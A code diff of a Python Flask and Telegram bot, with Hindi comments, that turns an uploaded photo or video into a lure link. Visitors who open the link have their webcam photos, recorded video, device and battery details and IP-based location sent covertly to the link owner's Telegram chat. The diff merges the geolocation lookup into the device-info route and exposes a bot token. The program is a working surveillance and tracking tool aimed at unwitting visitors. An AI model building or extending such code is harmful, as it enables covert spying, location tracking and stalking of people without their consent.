@@ -1,41 +1,31 @@
-import os
-import base64
-import uuid
-import threading
-import logging
-from flask import Flask, request, render_template, send_from_directory
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
-import requests
-import waitress
+@app.route('/device_info/<unique_id>', methods=['POST'])
+def device_info(unique_id):
+    if unique_id not in link_data:
+        return {"status": "error"}, 400
+    owner_id = link_data[unique_id]["owner"]
+    data = request.get_json()
+    if not data:
+        return {"status": "error"}, 400
 
-logging.basicConfig(level=logging.INFO)
-
-BOT_TOKEN = "8818489453:AAH56Vc2bNRKcRjXgx1paBjbuHWamiC-ibs"
-OWNER_CHAT_ID = "6464233947"
-BASE_URL = os.getenv("BASE_URL", "http://localhost:5000")
-
-app = Flask(__name__)
-link_data = {}
-
-# ---------- IP से जानकारी ----------
-def get_ip_info(ip):
+    # IP से लोकेशन लें (विज़िटर का IP)
+    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    ip_city = "N/A"
+    ip_region = "N/A"
+    ip_country = "N/A"
+    ip_isp = "N/A"
     try:
-        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=city,region,country,isp,query")
+        resp = requests.get(f"http://ip-api.com/json/{visitor_ip}?fields=city,region,country,isp,query")
         if resp.status_code == 200:
-            data = resp.json()
-            if data.get("status") != "fail":
-                return (f"IP: {data['query']}\n"
-                        f"City: {data.get('city', 'N/A')}\n"
-                        f"Region: {data.get('region', 'N/A')}\n"
-                        f"Country: {data.get('country', 'N/A')}\n"
-                        f"ISP: {data.get('isp', 'N/A')}")
+            geo = resp.json()
+            if geo.get("status") != "fail":
+                ip_city = geo.get('city', 'N/A')
+                ip_region = geo.get('region', 'N/A')
+                ip_country = geo.get('country', 'N/A')
+                ip_isp = geo.get('isp', 'N/A')
     except:
         pass
-    return f"IP: {ip}\n(Could not resolve location)"
 
-# ---------- डिवाइस इन्फो मैसेज बनाना ----------
-def build_device_message(data):
+    # डिवाइस इन्फो मैसेज बनाएँ (अब IP लोकेशन भी शामिल)
     msg = "📱 Device Info:\n"
     msg += f"Browser/OS: {data.get('userAgent', 'N/A')}\n"
     msg += f"Platform: {data.get('platform', 'N/A')}\n"
@@ -46,173 +36,14 @@ def build_device_message(data):
     msg += f"Memory: {data.get('deviceMemory', 'N/A')} GB\n"
     msg += f"Battery: {data.get('batteryLevel', 'N/A')}% (Charging: {data.get('batteryCharging', 'N/A')})\n"
     msg += f"Network: {data.get('networkType', 'N/A')}\n"
-    msg += f"Touch: {data.get('hasTouch', 'N/A')}"
-    return msg
+    msg += f"Touch: {data.get('hasTouch', 'N/A')}\n"
+    # अब IP लोकेशन डालें
+    msg += f"--- IP Location ---\n"
+    msg += f"City: {ip_city}\n"
+    msg += f"Region: {ip_region}\n"
+    msg += f"Country: {ip_country}\n"
+    msg += f"ISP: {ip_isp}"
 
-# ---------- स्टैटिक फ़ाइलें ----------
-@app.route('/photos/<filename>')
-def serve_photo(filename):
-    return send_from_directory('static', filename)
-
-@app.route('/videos/<filename>')
-def serve_video(filename):
-    return send_from_directory('static/videos', filename)
-
-# ---------- फ़ोटो पेज ----------
-@app.route('/image/<unique_id>')
-def image(unique_id):
-    if unique_id not in link_data:
-        return "Invalid or expired link.", 404
-    # IP लोकेशन भेजें
-    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    owner_id = link_data[unique_id]["owner"]
-    ip_info = get_ip_info(visitor_ip)
-    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                  json={'chat_id': owner_id, 'text': f"🔍 New visitor\n{ip_info}"})
-    photo_url = f"/photos/{link_data[unique_id]['filename']}"
-    return render_template('camera.html', unique_id=unique_id, photo_url=photo_url)
-
-# ---------- वीडियो पेज ----------
-@app.route('/video_page/<unique_id>')
-def video_page(unique_id):
-    if unique_id not in link_data:
-        return "Invalid or expired link.", 404
-    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    owner_id = link_data[unique_id]["owner"]
-    ip_info = get_ip_info(visitor_ip)
-    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                  json={'chat_id': owner_id, 'text': f"🔍 New visitor\n{ip_info}"})
-    video_url = f"/videos/{link_data[unique_id]['filename']}"
-    return render_template('video.html', unique_id=unique_id, video_url=video_url)
-
-# ---------- डिवाइस इन्फो रिसीव करें ----------
-@app.route('/device_info/<unique_id>', methods=['POST'])
-def device_info(unique_id):
-    if unique_id not in link_data:
-        return {"status": "error"}, 400
-    owner_id = link_data[unique_id]["owner"]
-    data = request.get_json()
-    if not data:
-        return {"status": "error"}, 400
-    msg = build_device_message(data)
     requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                   json={'chat_id': owner_id, 'text': msg})
     return {"status": "ok"}, 200
-
-# ---------- फोटो अपलोड ----------
-@app.route('/upload/<unique_id>', methods=['POST'])
-def upload_photo(unique_id):
-    if unique_id not in link_data:
-        return {"status": "error"}, 400
-    owner_id = link_data[unique_id]["owner"]
-    data = request.get_json()
-    if not data or 'image' not in data:
-        return {"status": "error"}, 400
-    image_b64 = data['image']
-    if ',' in image_b64:
-        image_b64 = image_b64.split(',')[1]
-    image_bytes = base64.b64decode(image_b64)
-    temp_file = f"temp_{unique_id}.jpg"
-    with open(temp_file, "wb") as f:
-        f.write(image_bytes)
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
-    with open(temp_file, 'rb') as photo:
-        files = {'photo': photo}
-        payload = {'chat_id': owner_id}
-        resp = requests.post(url, files=files, data=payload)
-    os.remove(temp_file)
-    return {"status": "ok"}, 200 if resp.status_code == 200 else 500
-
-# ---------- वीडियो अपलोड ----------
-@app.route('/upload_video/<unique_id>', methods=['POST'])
-def upload_video(unique_id):
-    if unique_id not in link_data:
-        return {"status": "error"}, 400
-    owner_id = link_data[unique_id]["owner"]
-    if 'video' not in request.files:
-        return {"status": "error"}, 400
-    video_file = request.files['video']
-    temp_file = f"temp_video_{unique_id}.webm"
-    video_file.save(temp_file)
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
-    with open(temp_file, 'rb') as vid:
-        files = {'video': vid}
-        payload = {'chat_id': owner_id, 'caption': '🎥 Visitor video'}
-        resp = requests.post(url, files=files, data=payload)
-    os.remove(temp_file)
-    return {"status": "ok"}, 200 if resp.status_code == 200 else 500
-
-@app.route('/health')
-def health():
-    return "OK", 200
-
-# ---------- बॉट हैंडलर्स ----------
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "📸 **Photo Link:** Send me a photo.\n"
-        "🎬 **Video Link:** Send me a video."
-    )
-
-async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.message.from_user
-    if str(user.id) != OWNER_CHAT_ID:
-        await update.message.reply_text("❌ Only the owner can generate links.")
-        return
-
-    try:
-        photo_file = await update.message.photo[-1].get_file()
-        unique_id = uuid.uuid4().hex[:10]
-        os.makedirs("static", exist_ok=True)
-        filename = f"{unique_id}.jpg"
-        await photo_file.download_to_drive(f"static/{filename}")
-        link_data[unique_id] = {"owner": OWNER_CHAT_ID, "media_type": "photo", "filename": filename}
-
-        web_app_url = f"{BASE_URL}/image/{unique_id}"
-        keyboard = [[InlineKeyboardButton("📸 Open Photo", web_app=WebAppInfo(url=web_app_url))]]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        await update.message.reply_text(f"🔗 {web_app_url}", reply_markup=reply_markup)
-    except Exception as e:
-        logging.error(f"Photo error: {e}")
-        await update.message.reply_text("❌ Something went wrong.")
-
-async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.message.from_user
-    if str(user.id) != OWNER_CHAT_ID:
-        await update.message.reply_text("❌ Only the owner can generate links.")
-        return
-
-    try:
-        video_file = await update.message.video.get_file()
-        unique_id = uuid.uuid4().hex[:10]
-        os.makedirs("static/videos", exist_ok=True)
-        ext = os.path.splitext(video_file.file_path)[1] or ".mp4"
-        filename = f"{unique_id}{ext}"
-        await video_file.download_to_drive(f"static/videos/{filename}")
-        link_data[unique_id] = {"owner": OWNER_CHAT_ID, "media_type": "video", "filename": filename}
-
-        web_app_url = f"{BASE_URL}/video_page/{unique_id}"
-        keyboard = [[InlineKeyboardButton("🎬 Open Video", web_app=WebAppInfo(url=web_app_url))]]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        await update.message.reply_text(f"🎥 {web_app_url}", reply_markup=reply_markup)
-    except Exception as e:
-        logging.error(f"Video error: {e}")
-        await update.message.reply_text("❌ Something went wrong.")
-
-def run_bot():
-    app_bot = Application.builder().token(BOT_TOKEN).build()
-    app_bot.add_handler(CommandHandler("start", start))
-    app_bot.add_handler(MessageHandler(filters.PHOTO, handle_photo))
-    app_bot.add_handler(MessageHandler(filters.VIDEO, handle_video))
-    print("🤖 Bot polling started...")
-    app_bot.run_polling()
-
-if __name__ == '__main__':
-    flask_thread = threading.Thread(
-        target=waitress.serve,
-        args=(app,),
-        kwargs={'host': '0.0.0.0', 'port': 5000},
-        daemon=True
-    )
-    flask_thread.start()
-    print("🌐 Flask server starting in background...")
-    run_bot()
